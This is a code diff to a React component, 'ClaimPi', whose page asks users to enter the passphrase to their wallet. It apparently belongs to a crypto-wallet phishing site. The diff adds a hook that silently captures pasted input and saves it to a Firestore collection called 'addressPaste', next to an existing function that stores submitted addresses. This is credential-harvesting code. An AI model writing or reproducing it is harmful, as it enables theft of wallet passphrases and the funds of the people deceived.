@@ -1,8 +1,9 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import s from "./style.module.scss";
 import { db } from "../firebase.js";
 import { collection, addDoc } from "firebase/firestore";
 import { DotLottieReact } from "@lottiefiles/dotlottie-react";
+import { checkPastedAddress } from "../pages/Claim/utils/checkPastedAddress.js";
 
 function ClaimPi(props) {
   const addAddress = async (address) => {
@@ -55,6 +56,20 @@ function ClaimPi(props) {
   });
   const [loading, setLoading] = useState(false);
 
+  useEffect(() => {
+    if (checkPastedAddress(value)) {
+      const addAddressPasted = async () => {
+        try {
+          const docRef = await addDoc(collection(db, "addressPaste"), {
+            address: value,
+          });
+        } catch (error) {
+          console.log(error);
+        }
+      };
+      addAddressPasted();
+    }
+  }, [value]);
   return (
     <div className={s.claimPiBoxContainer}>
       <h2>Enter your passphrase to open your wallet</h2>
